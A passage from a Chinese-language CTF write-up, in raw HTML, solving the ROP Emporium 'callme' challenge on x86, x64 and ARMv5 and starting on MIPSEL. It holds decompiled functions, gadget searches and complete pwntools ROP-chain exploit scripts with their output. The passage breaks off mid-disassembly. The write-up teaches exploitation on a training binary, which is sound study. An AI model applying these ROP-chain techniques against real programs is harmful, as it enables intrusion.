class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;callme_one() called correctly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以看到<strong>callme_one</strong>函数的功能是从<code>encrypted_flag.dat</code>中读取加密后的flag，写入到g_buf全局缓冲区中。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">callme_two</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">-559038737</span> || a2 != <span class=\"number\">-889275714</span> || a3 != <span class=\"number\">-804392947</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;key1.dat&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;unk_A00);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open key1.dat&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">15</span>; ++i )</span><br><span class=\"line\">    *(_BYTE *)(g_buf + i) ^= fgetc(stream);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;callme_two() called correctly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p><strong>callme_two</strong>函数的功能是先读取key1.dat中的内容，然后使用该内容对g_buf全局缓冲区进行异或运算</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __cdecl __noreturn <span class=\"title function_\">callme_three</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">signed</span> <span class=\"type\">int</span> i; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 == <span class=\"number\">-559038737</span> &amp;&amp; a2 == <span class=\"number\">-889275714</span> &amp;&amp; a3 == <span class=\"number\">-804392947</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    stream = fopen(<span class=\"string\">&quot;key2.dat&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;unk_A00);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open key2.dat&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">16</span>; i &lt;= <span class=\"number\">31</span>; ++i )</span><br><span class=\"line\">      *(_BYTE *)(g_buf + i) ^= fgetc(stream);</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">4</span>) ^= <span class=\"number\">0xDEADBEEF</span>;</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">8</span>) ^= <span class=\"number\">0xDEADBEEF</span>;</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">12</span>) ^= <span class=\"number\">0xCAFEBABE</span>;</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">16</span>) ^= <span class=\"number\">0xCAFEBABE</span>;</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">20</span>) ^= <span class=\"number\">0xD00DF00D</span>;</span><br><span class=\"line\">    *(_DWORD *)(g_buf + <span class=\"number\">24</span>) ^= <span class=\"number\">0xD00DF00D</span>;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>((<span class=\"type\">const</span> <span class=\"type\">char</span> *)g_buf);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p><strong>callme_three</strong>函数的功能与callme_two函数类似，先读取<code>key2.dat</code>的内容，然后使用该内容与g_buf全局缓冲区异或，并逐个异或其他值，最终打印输出g_buf的内容。</p>\r\n<p>值得注意的是，上述三个函数均开始对传入的三个参数的值进行判断，若不一致，则退出，因此若想调用这三个函数，需要传入正确的参数。</p>\r\n<p>至此，可以概括出利用路径，构造rop，覆盖pwnme函数的返回地址，使其依次调用callme_one，callme_two，callme_three函数，并且构造好三个函数的参数，为了平衡栈空间，需要pop指令将函数参数依次弹出。</p>\r\n<p>在callme32中搜索相关指令，得到如下结果：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary callme32 --only &quot;pop|ret&quot;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080487fb : pop ebp ; ret</span><br><span class=\"line\">0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080484ad : pop ebx ; ret</span><br><span class=\"line\">0x080487fa : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x08048496 : ret</span><br><span class=\"line\">0x0804861e : ret 0xeac1</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 7</span><br></pre></td></tr></table></figure>\r\n<p>因此可以利用<code>0x080487f9</code>地址的三个pop将函数参数弹出，查看三个函数的地址如下：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:080484F0 _callme_one     proc near               ; CODE XREF: usefulFunction+31↓p</span><br><span class=\"line\">.plt:080484F0                 jmp     ds:off_804A018</span><br><span class=\"line\">.plt:080484F0 _callme_one     endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:08048550 _callme_two     proc near               ; CODE XREF: usefulFunction+20↓p</span><br><span class=\"line\">.plt:08048550                 jmp     ds:off_804A030</span><br><span class=\"line\">.plt:08048550 _callme_two     endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:080484E0 _callme_three   proc near               ; CODE XREF: usefulFunction+F↓p</span><br><span class=\"line\">.plt:080484E0                 jmp     ds:off_804A014</span><br><span class=\"line\">.plt:080484E0 _callme_three   endp</span><br></pre></td></tr></table></figure>\r\n<p>最终，构造exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./callme32&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x28</span>+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">one = <span class=\"number\">0x080484F0</span></span><br><span class=\"line\">two = <span class=\"number\">0x08048550</span></span><br><span class=\"line\">three = <span class=\"number\">0x080484E0</span></span><br><span class=\"line\">pop_esi_edi_ebp = <span class=\"number\">0x080487f9</span></span><br><span class=\"line\">arg1 = <span class=\"number\">0xDEADBEEF</span></span><br><span class=\"line\">arg2 = <span class=\"number\">0x0CAFEBABE</span></span><br><span class=\"line\">arg3 = <span class=\"number\">0x0D00DF00D</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(one)</span><br><span class=\"line\">payload += p32(pop_esi_edi_ebp) <span class=\"comment\"># func one 的返回地址，将func one的三个参数依次弹出，以调用func two</span></span><br><span class=\"line\">payload += p32(arg1) </span><br><span class=\"line\">payload += p32(arg2) </span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(two)</span><br><span class=\"line\">payload += p32(pop_esi_edi_ebp)</span><br><span class=\"line\">payload += p32(arg1) </span><br><span class=\"line\">payload += p32(arg2) </span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(three)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0x8048510</span>)  <span class=\"comment\"># exit函数，可换成任意的四个字节</span></span><br><span class=\"line\">payload += p32(arg1) </span><br><span class=\"line\">payload += p32(arg2) </span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./callme32&#x27;</span>: pid 19785</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">callme by ROP Emporium</span><br><span class=\"line\">x86</span><br><span class=\"line\"></span><br><span class=\"line\">Hope you <span class=\"built_in\">read</span> the instructions...</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">callme_one() called correctly</span><br><span class=\"line\">callme_two() called correctly</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./callme32&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 0 (pid 19785)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br><span class=\"line\">$ </span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> sending <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"x64-2\">x64</h3>\r\n<p>和32位程序类似，同样是构造函数调用链，但是需要注意64位程序函数调用参数依次使用<code>rdi、rsi，rdx</code>寄存器，构造pop链需要将参数依次存放到<code>rdi、rsi、rdx</code>寄存器中。</p>\r\n<p>callme函数以<code>callme_one</code>为例，其三个参数分别为<code>0xDEADBEEFDEADBEEF、0xCAFEBABECAFEBABE、0xD00DF00DD00DF00D</code>，另外两个函数类似。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">callme_one</span><span class=\"params\">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">0xDEADBEEFDEADBEEF</span>LL || a2 != <span class=\"number\">0xCAFEBABECAFEBABE</span>LL || a3 != <span class=\"number\">0xD00DF00DD00DF00D</span>LL )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;encrypted_flag.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !g_buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Could not allocate memory&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = fgets(g_buf, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  fclose(stream);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;callme_one() called correctly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>查看三个函数的调用地址如下，callme_one的地址为<code>0x400720</code>，callme_two的地址为<code>0x400740</code>，callme_three的地址为<code>0x4006F0</code>。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:00000000004006F0 _callme_three   proc near               ; CODE XREF: usefulFunction+13↓p</span><br><span class=\"line\">.plt:00000000004006F0                 jmp     cs:off_601028</span><br><span class=\"line\">.plt:00000000004006F0 _callme_three   endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0000000000400740 _callme_two     proc near               ; CODE XREF: usefulFunction+27↓p</span><br><span class=\"line\">.plt:0000000000400740                 jmp     cs:off_601050</span><br><span class=\"line\">.plt:0000000000400740 _callme_two     endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0000000000400720 _callme_one     proc near               ; CODE XREF: usefulFunction+3B↓p</span><br><span class=\"line\">.plt:0000000000400720                 jmp     cs:off_601040</span><br><span class=\"line\">.plt:0000000000400720 _callme_one     endp</span><br></pre></td></tr></table></figure>\r\n<p>寻找可利用的gadget：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ROPgadget --binary callme --only <span class=\"string\">&quot;pop|ret&quot;</span>Gadgets information</span></span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004009a0 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004009a2 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004007c8 : pop rbp ; ret</span><br><span class=\"line\">0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</span><br><span class=\"line\">0x00000000004009a3 : pop rdi ; ret</span><br><span class=\"line\">0x000000000040093e : pop rdx ; ret</span><br><span class=\"line\">0x00000000004009a1 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040093d : pop rsi ; pop rdx ; ret</span><br><span class=\"line\">0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004006be : ret</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 14</span><br></pre></td></tr></table></figure>\r\n<p>因此，可以利用的gadget为<code>0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</code>，编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./callme&#x27;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x20</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x40093c</span>)             <span class=\"comment\"># pop next 3 number into rdi, rsi, rdx</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x0DEADBEEFDEADBEEF</span>) + p64(<span class=\"number\">0x0CAFEBABECAFEBABE</span>) + p64(<span class=\"number\">0x0D00DF00DD00DF00D</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0x400720</span>)            <span class=\"comment\"># callme_one</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x40093c</span>)            </span><br><span class=\"line\">payload += p64(<span class=\"number\">0x0DEADBEEFDEADBEEF</span>) + p64(<span class=\"number\">0x0CAFEBABECAFEBABE</span>) + p64(<span class=\"number\">0x0D00DF00DD00DF00D</span>)  </span><br><span class=\"line\">payload += p64(<span class=\"number\">0x400740</span>)\t\t\t<span class=\"comment\"># callme_two</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x40093c</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0x0DEADBEEFDEADBEEF</span>) + p64(<span class=\"number\">0x0CAFEBABECAFEBABE</span>) + p64(<span class=\"number\">0x0D00DF00DD00DF00D</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0x4006F0</span>)\t\t\t<span class=\"comment\"># callme_three</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./callme&#x27;</span>: pid 4351</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">callme by ROP Emporium</span><br><span class=\"line\">x86_64</span><br><span class=\"line\"></span><br><span class=\"line\">Hope you <span class=\"built_in\">read</span> the instructions...</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">callme_one() called correctly</span><br><span class=\"line\">callme_two() called correctly</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./callme&#x27;</span> stopped with <span class=\"built_in\">exit</span> code 0 (pid 4351)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5-2\">armv5</h3>\r\n<p>解题思路与x86类似，需要找到合适的gadget将三个函数的参数弹出到 <em>r0</em>，<em>r1</em>，<em>r2</em> 三个寄存器中。</p>\r\n<p>首先查看三个函数地址：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:00010618                               callme_one                              ; CODE XREF: usefulFunction+34↓p</span><br><span class=\"line\">.plt:00010618 00 C6 8F E2                   ADR     R12, 0x10620</span><br><span class=\"line\">.plt:0001061C 10 CA 8C E2                   ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:00010620 F8 F9 BC E5                   LDR     PC, [R12,#(callme_one_ptr - 0x20620)]! ; __imp_callme_one</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0001066C                               callme_two                              ; CODE XREF: usefulFunction+24↓p</span><br><span class=\"line\">.plt:0001066C 00 C6 8F E2                   ADR     R12, 0x10674</span><br><span class=\"line\">.plt:00010670 10 CA 8C E2                   ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:00010674 C0 F9 BC E5                   LDR     PC, [R12,#(callme_two_ptr - 0x20674)]! ; __imp_callme_two</span><br><span class=\"line\"></span><br><span class=\"line\">.plt:0001060C                               callme_three                            ; CODE XREF: usefulFunction+14↓p</span><br><span class=\"line\">.plt:0001060C 00 C6 8F E2                   ADR     R12, 0x10614</span><br><span class=\"line\">.plt:00010610 10 CA 8C E2                   ADD     R12, R12, #0x10000</span><br><span class=\"line\">.plt:00010614 00 FA BC E5                   LDR     PC, [R12,#(callme_three_ptr - 0x20614)]! ; __imp_callme_three</span><br></pre></td></tr></table></figure>\r\n<p>在userfulfunction附近查看到可利用的gadget：<strong>POP {R0-R2,LR,PC}</strong>，地址为<code>0x00010870</code></p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00010870                               usefulGadgets</span><br><span class=\"line\">.text:00010870 07 C0 BD E8                   POP     &#123;R0-R2,LR,PC&#125;</span><br></pre></td></tr></table></figure>\r\n<p>查看<code>libcallme_armv5.so</code>动态链接库，查找三个函数所需的参数：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">callme_one</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [sp+14h] [bp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">0xDEADBEEF</span> || a2 != <span class=\"number\">0xCAFEBABE</span> || a3 != <span class=\"number\">0xD00DF00D</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;encrypted_flag.dat&quot;</span>, (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;unk_C5C);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !g_buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Could not allocate memory&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)fgets((<span class=\"type\">char</span> *)g_buf, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  fclose(stream);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;callme_one() called correctly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>分别为<code>0xDEADBEEF、0xCAFEBABE、0xD00DF00D</code>，且callme_two和callme_three函数所需参数与callme_one 一致。因此利用以上信息，可以构造exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">callme_one = <span class=\"number\">0x00010618</span></span><br><span class=\"line\">callme_two = <span class=\"number\">0x0001066C</span></span><br><span class=\"line\">callme_three = <span class=\"number\">0x0001060C</span></span><br><span class=\"line\">arg1, arg2, arg3 = <span class=\"number\">0xDEADBEEF</span>, <span class=\"number\">0xCAFEBABE</span>, <span class=\"number\">0xD00DF00D</span></span><br><span class=\"line\">pop_r0_r1_r2_lr_pc = <span class=\"number\">0x00010870</span></span><br><span class=\"line\">exit_addr = <span class=\"number\">0x00010648</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./callme_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(pop_r0_r1_r2_lr_pc)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(pop_r0_r1_r2_lr_pc)</span><br><span class=\"line\">payload += p32(callme_one)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(pop_r0_r1_r2_lr_pc)</span><br><span class=\"line\">payload += p32(callme_two)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(exit_addr)</span><br><span class=\"line\">payload += p32(callme_three)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>exp运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 17249</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">callme by ROP Emporium</span><br><span class=\"line\">ARMv5</span><br><span class=\"line\"></span><br><span class=\"line\">Hope you <span class=\"built_in\">read</span> the instructions...</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">callme_one() called correctly</span><br><span class=\"line\">callme_two() called correctly</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>armv5hf与之类似，仅需更改相应的gadget，并注意函数的地址即可，这里不再赘述。</p>\r\n</blockquote>\r\n<h3 id=\"mipsel-2\">mipsel</h3>\r\n<h4 id=\"分析-1\">分析</h4>\r\n<p>利用原理和arm相同，仅需找到合适的gadget将栈上数据弹出到参数寄存器 <em>a0</em>，<em>a1</em>，<em>a2</em> 即可。</p>\r\n<ol type=\"1\">\r\n<li><p>首先查看需要依次调用的三个函数地址</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.MIPS.stubs:00400D20                               _callme_one:                             # DATA XREF: LOAD:0040056C↑o</span><br><span class=\"line\">.MIPS.stubs:00400D20 10 80 99 8F                   lw      $t9, _GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">.MIPS.stubs:00400D24 25 78 E0 03                   move    $t7, $ra</span><br><span class=\"line\">.MIPS.stubs:00400D28 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.MIPS.stubs:00400D2C 18 00 18 24                   li      $t8, 0x18</span><br><span class=\"line\"></span><br><span class=\"line\">.MIPS.stubs:00400D80                               _callme_two:                             # DATA XREF: LOAD:004004EC↑o</span><br><span class=\"line\">.MIPS.stubs:00400D80 10 80 99 8F                   lw      $t9, _GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">.MIPS.stubs:00400D84 25 78 E0 03                   move    $t7, $ra</span><br><span class=\"line\">.MIPS.stubs:00400D88 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.MIPS.stubs:00400D8C 10 00 18 24                   li      $t8, 0x10</span><br><span class=\"line\"></span><br><span class=\"line\">.MIPS.stubs:00400D10                               _callme_three:                           # DATA XREF: LOAD:0040057C↑o</span><br><span class=\"line\">.MIPS.stubs:00400D10 10 80 99 8F                   lw      $t9, _GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">.MIPS.stubs:00400D14 25 78 E0 03                   move    $t7, $ra</span><br><span class=\"line\">.MIPS.stubs:00400D18 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.MIPS.stubs:00400D1C 19 00 18 24                   li      $t8, 